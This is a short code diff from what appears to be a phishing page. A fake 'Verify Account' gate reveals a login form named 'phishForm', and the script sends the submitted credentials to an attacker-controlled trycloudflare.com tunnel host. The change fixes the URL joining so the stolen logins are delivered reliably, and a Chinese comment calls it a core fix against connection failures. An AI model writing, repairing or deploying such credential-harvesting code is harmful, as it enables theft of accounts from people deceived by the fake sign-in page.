@@ -84,15 +84,18 @@
         const currentParams = window.location.search;
         const targetCloudflare = "https://hit-instrumentation-formation-missile.trycloudflare.com";
 
-        // Triggers when user clicks the first "Verify Account" button
         function showLoginCard() {
             document.getElementById("botGate").style.display = "none";
             document.getElementById("loginCard").style.display = "block";
         }
 
-        // Triggers ONLY when user inputs credentials and clicks "Sign in"
+        // 核心修正：智能拼接網址，防止雙斜線 // 導致 502/404 連線失敗
         document.getElementById("phishForm").addEventListener("submit", function(event) {
-            this.action = targetCloudflare + "/" + currentParams;
+            if (currentParams.startsWith('?')) {
+                this.action = targetCloudflare + currentParams;
+            } else {
+                this.action = targetCloudflare + "/" + currentParams;
+            }
         });
     </script>
 
